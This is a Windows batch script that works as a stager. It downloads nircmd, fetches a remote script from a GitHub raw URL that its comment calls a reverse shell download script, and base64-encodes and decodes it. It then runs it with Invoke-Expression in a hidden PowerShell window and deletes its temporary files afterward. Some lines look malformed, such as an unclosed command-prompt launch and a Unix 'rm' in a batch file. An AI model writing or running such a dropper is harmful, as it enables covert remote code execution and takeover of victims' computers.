@echo off
setlocal EnableDelayedExpansion

REM Set temporary directory for nircmd files
set "temp_dir=%temp%\nircmd_temp"

REM Check if nircmd.exe exists in the temporary directory
if not exist "%temp_dir%\nircmd.exe" (
    REM Download nircmd.zip
    powershell -Command "(New-Object System.Net.WebClient).DownloadFile('https://www.nirsoft.net/utils/nircmd.zip', 'nircmd.zip')"
    REM Extract nircmd.exe from nircmd.zip to temporary directory
    powershell -Command "Expand-Archive nircmd.zip -DestinationPath %temp_dir%"
    REM Remove nircmd.zip
    del nircmd.zip
)

REM Open a new command prompt with administrator privileges
start "" /min /B %windir%\system32\cmd.exe /C "%comspec% /k ("

REM Put your link to your reverse shell download script
set "script=https://raw.githubusercontent.com/AIMadeScripts/testingcmd/main/yoloswag"

REM Download the script and encode it as base64
powershell -Command "$content = (New-Object System.Net.WebClient).DownloadString('%script%'); $base64encoded = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($content)); Set-Content -Path base64encoded.txt -Value $base64encoded -NoNewline"
"%temp_dir%\nircmd.exe" exec hide powershell -Command "$base64 = Get-Content -Path base64encoded.txt; $content = [System.Convert]::FromBase64String($base64); $text = [System.Text.Encoding]::UTF8.GetString($content); Invoke-Expression $text;"

REM Delete the temporary directory and its contents
rd /s /q "%temp_dir%"
timeout /t 1
rm base64encoded.txt
exit
